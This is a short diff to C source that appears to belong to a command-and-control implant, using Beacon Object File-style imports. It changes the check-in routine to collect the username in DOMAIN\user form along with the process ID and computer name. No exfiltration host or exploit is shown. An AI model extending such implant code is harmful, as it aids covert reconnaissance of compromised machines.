@@ -1,5 +1,8 @@
+#define SECURITY_WIN32
+
 #include <windows.h>
 #include <lm.h>
+#include <security.h>
 #include "../headers/celebi.h"
 
 WINBASEAPI DWORD KERNEL32$GetCurrentProcessId();
@@ -7,7 +10,7 @@ WINBASEAPI BOOL KERNEL32$GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
 WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
 
-WINBASEAPI BOOL ADVAPI32$GetUserNameA(LPCSTR lpBuffer, LPDWORD pcbBuffer);
+WINBASEAPI BOOLEAN WINAPI SECUR32$GetUserNameExA(int NameFormat, LPSTR lpNameBuffer, PULONG nSize);
 WINBASEAPI NET_API_STATUS WINAPI NETAPI32$NetWkstaGetInfo(LMSTR, DWORD, LPBYTE*);
 WINBASEAPI NET_API_STATUS WINAPI NETAPI32$NetApiBufferFree(LPVOID);
 
@@ -18,7 +21,7 @@ void go(CheckinRequest *req) {
 	req->pid = KERNEL32$GetCurrentProcessId();
 	
 	char *username = KERNEL32$VirtualAlloc(0, 256, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	result = ADVAPI32$GetUserNameA(username, &len);
+	result = SECUR32$GetUserNameExA(NameSamCompatible, username, &len);
 	if (result == TRUE) {
 		req->username = username;
 	} else {
